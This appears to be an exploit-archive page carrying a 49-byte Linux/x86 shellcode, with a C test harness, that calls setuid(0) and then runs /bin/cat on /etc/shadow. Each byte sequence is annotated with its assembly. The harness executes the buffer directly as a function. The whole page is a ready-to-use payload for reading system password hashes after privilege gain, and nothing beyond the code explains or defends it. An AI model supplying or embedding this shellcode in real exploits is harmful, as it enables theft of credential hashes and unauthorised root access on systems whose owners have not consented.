<html><head><title>Linux/x86 - setuid(0) &amp; execve(/bin/cat /etc/shadow) - 49 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;
 
/*
    linux/x86 ; setuid(0) &amp; execve(/bin/cat /etc/shadow) 49 bytes
    written by ka0x - &lt;ka0x01[alt+64]gmail.com&gt;
    lun sep 21 16:40:16 CEST 2009
 
    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
*/
 
int main()
{
    char shellcode[] =
            &quot;\x31\xdb&quot;      // xor ebx,ebx
            &quot;\x6a\x17&quot;      // push byte 17h   
            &quot;\x58&quot;          // pop eax
            &quot;\xcd\x80&quot;      // int 0x80
            &quot;\x8d\x43\x0b&quot;      // lea eax,[ebx+0xb]
            &quot;\x99&quot;          // cdq
            &quot;\x52&quot;          // push edx
            &quot;\x68\x2f\x63\x61\x74&quot;  // push dword 0x7461632f
            &quot;\x68\x2f\x62\x69\x6e&quot;  // push dword 0x6e69622f
            &quot;\x89\xe3&quot;      // mov ebx,esp
            &quot;\x52&quot;          // push edx
            &quot;\x68\x61\x64\x6f\x77&quot;  // push dword 0x776f6461
            &quot;\x68\x2f\x2f\x73\x68&quot;  // push dword 0x68732f2f
            &quot;\x68\x2f\x65\x74\x63&quot;  // push dword 0x6374652f
            &quot;\x89\xe1&quot;      // mov ecx,esp
            &quot;\x52&quot;          // push edx
            &quot;\x51&quot;          // push ecx
            &quot;\x53&quot;          // push ebx
            &quot;\x89\xe1&quot;      // mov ecx,esp
            &quot;\xcd\x80&quot; ;        // int 80h
 
    printf(&quot;[*] ShellCode size (bytes): %d\n\n&quot;, sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();
     
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
